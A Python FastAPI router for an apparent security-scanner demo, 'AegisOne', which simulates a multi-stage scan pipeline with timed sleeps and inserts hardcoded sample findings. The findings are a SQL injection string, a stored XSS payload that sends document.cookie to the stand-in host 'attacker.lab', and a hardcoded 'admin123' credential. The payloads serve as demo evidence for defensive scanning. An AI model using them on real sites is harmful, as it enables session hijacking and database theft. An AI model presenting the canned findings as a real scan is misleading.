"""
AegisOne AI Scan API
Orchestrates the Security Decision Pipeline:
DETECT → CONTEXT → GRAPH → RISK → EXPLAIN → FIX → SANDBOX → VALIDATE → RESCAN → DECISION
"""
import asyncio
from datetime import datetime, timezone
from typing import List
from fastapi import APIRouter, Depends, HTTPException, BackgroundTasks
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from backend.app.core.database import get_db
from backend.app.models import Project, Scan, Finding, Evidence, Asset
from backend.app.schemas import ScanCreate, ScanResponse, FindingResponse
from backend.app.services.scope_guard import verify_target
from backend.app.services.risk_engine import (
    RiskFactors, compute_risk, sensitivity_to_factor, exposure_to_factor
)
from backend.app.services.audit_logger import log_event

router = APIRouter(prefix="/scans", tags=["Scans"])

# ─── Demo Data: Controlled findings for College Placement Portal ───────────────
DEMO_FINDINGS_DATA = [
    {
        "title": "SQL Injection in Student Search Endpoint",
        "description": "The '/api/students/search' endpoint does not use parameterized queries. User-supplied 'department' parameter is concatenated directly into a SQL query, enabling attackers to extract or modify the student database.",
        "technical_severity": 9.1,
        "cwe_id": "CWE-89",
        "owasp_category": "A03:2021 - Injection",
        "affected_endpoint": "/api/students/search",
        "affected_parameter": "department",
        "exploit_factor": 0.9,
        "confidence": 0.98,
        "tool_name": "AegisOne DAST Engine",
        "raw_payload": "department=' OR 1=1 -- &limit=100",
    },
    {
        "title": "Stored XSS in Student Profile Bio Field",
        "description": "The student profile 'bio' field renders user-submitted HTML without sanitization, allowing stored Cross-Site Scripting. An attacker can inject scripts that execute in other users' browsers.",
        "technical_severity": 7.4,
        "cwe_id": "CWE-79",
        "owasp_category": "A03:2021 - Injection (XSS)",
        "affected_endpoint": "/profile/update",
        "affected_parameter": "bio",
        "exploit_factor": 0.75,
        "confidence": 0.95,
        "tool_name": "AegisOne DAST Engine",
        "raw_payload": "<script>document.location='http://attacker.lab/steal?c='+document.cookie</script>",
    },
    {
        "title": "Hardcoded Default Admin Credential",
        "description": "The application accepts a hardcoded default password 'admin123' for the admin account. This credential is embedded in the source code and not invalidated at first login.",
        "technical_severity": 8.2,
        "cwe_id": "CWE-798",
        "owasp_category": "A07:2021 - Identification and Authentication Failures",
        "affected_endpoint": "/auth/login",
        "affected_parameter": "password",
        "exploit_factor": 1.0,
        "confidence": 1.0,
        "tool_name": "AegisOne SAST Engine",
        "raw_payload": 'PASSWORD = "admin123"  # line 42 in config.py',
    },
]

async def _run_scan_pipeline(scan_id: str, project: Project, db_session):
    """Background task: executes the full security decision pipeline."""
    async with db_session() as db:
        try:
            # Fetch scan
            result = await db.execute(select(Scan).where(Scan.id == scan_id))
            scan = result.scalar_one_or_none()
            if not scan:
                return

            # Fetch first asset for context
            asset_result = await db.execute(
                select(Asset).where(Asset.project_id == project.id)
            )
            asset = asset_result.scalar_one_or_none()

            stages = [
                ("DETECT", "Crawler and fuzzer discovering endpoints", 10),
                ("CONTEXT", "Normalizing findings and extracting asset context", 25),
                ("GRAPH", "Traversing security knowledge graph", 40),
                ("RISK", "Computing context-aware risk scores", 55),
                ("EXPLAIN", "Generating evidence-grounded AI analysis", 70),
                ("FIX", "Proposing secure remediation candidates", 80),
                ("SANDBOX", "Dispatching patches to isolation sandbox", 90),
                ("VALIDATE", "Running regression and security validation", 95),
                ("RESCAN", "Re-scanning to verify remediation effectiveness", 98),
                ("DECISION", "Recording accept/reject decisions in audit log", 100),
            ]

            for stage_name, summary, progress in stages:
                scan.current_stage = stage_name
                scan.progress_percent = progress
                scan.summary = summary
                await db.commit()
                await asyncio.sleep(0.3)  # Realistic pipeline simulation

            # Create findings
            for fdata in DEMO_FINDINGS_DATA:
                factors = RiskFactors(
                    technical_severity=fdata["technical_severity"],
                    exploitability=fdata["exploit_factor"],
                    asset_criticality=asset.criticality if asset else 0.8,
                    data_sensitivity=sensitivity_to_factor(asset.data_sensitivity if asset else "HIGH_PII"),
                    exposure=exposure_to_factor(asset.exposure if asset else "EXTERNAL"),
                    confidence=fdata["confidence"]
                )
                risk = compute_risk(factors)

                finding = Finding(
                    scan_id=scan_id,
                    asset_id=asset.id if asset else None,
                    title=fdata["title"],
                    description=fdata["description"],
                    technical_severity=fdata["technical_severity"],
                    contextual_risk_score=risk.score,
                    risk_level=risk.level,
                    cwe_id=fdata["cwe_id"],
                    owasp_category=fdata["owasp_category"],
                    affected_endpoint=fdata["affected_endpoint"],
                    affected_parameter=fdata["affected_parameter"],
                    status="OPEN"
                )
                db.add(finding)
                await db.flush()

                evidence = Evidence(
                    finding_id=finding.id,
                    tool_name=fdata["tool_name"],
                    raw_payload=fdata["raw_payload"],
                    confidence=fdata["confidence"]
                )
                db.add(evidence)

            # Mark scan complete
            scan.status = "COMPLETED"
            scan.progress_percent = 100
            scan.current_stage = "DECISION"
            scan.summary = f"Scan completed. {len(DEMO_FINDINGS_DATA)} findings detected."
            scan.completed_at = datetime.now(timezone.utc)

            await log_event(db, "SCAN_COMPLETED", f"Security scan {scan_id} completed with {len(DEMO_FINDINGS_DATA)} findings",
                           project_id=project.id, resource_id=scan_id, resource_type="Scan")
            await db.commit()

        except Exception as e:
            async with db_session() as err_db:
                result = await err_db.execute(select(Scan).where(Scan.id == scan_id))
                scan = result.scalar_one_or_none()
                if scan:
                    scan.status = "FAILED"
                    scan.summary = f"Scan failed: {str(e)}"
                    await err_db.commit()


@router.post("/project/{project_id}", response_model=ScanResponse, status_code=201)
async def start_scan(
    project_id: str,
    scan_in: ScanCreate,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Project).where(Project.id == project_id))
    project = result.scalar_one_or_none()
    if not project:
        raise HTTPException(404, "Project not found")

    # Enforce scope guard
    verify_target(project.target_url)

    scan = Scan(
        project_id=project_id,
        scan_type=scan_in.scan_type,
        target_url=project.target_url,
        status="RUNNING",
        current_stage="DETECT",
        progress_percent=0
    )
    db.add(scan)
    await db.flush()
    await db.refresh(scan)

    await log_event(db, "SCAN_STARTED", f"Security scan initiated against {project.target_url}",
                   project_id=project_id, resource_id=scan.id, resource_type="Scan")

    from backend.app.core.database import AsyncSessionLocal
    background_tasks.add_task(_run_scan_pipeline, scan.id, project, AsyncSessionLocal)
    return scan


@router.get("/{scan_id}", response_model=ScanResponse)
async def get_scan(scan_id: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(Scan).where(Scan.id == scan_id))
    scan = result.scalar_one_or_none()
    if not scan:
        raise HTTPException(404, "Scan not found")
    return scan


@router.get("/{scan_id}/findings", response_model=List[FindingResponse])
async def get_scan_findings(scan_id: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(Finding).where(Finding.scan_id == scan_id)
                              .order_by(Finding.contextual_risk_score.desc()))
    return result.scalars().all()


@router.get("/project/{project_id}/all", response_model=List[ScanResponse])
async def get_project_scans(project_id: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(Scan).where(Scan.project_id == project_id)
                              .order_by(Scan.started_at.desc()))
    return result.scalars().all()
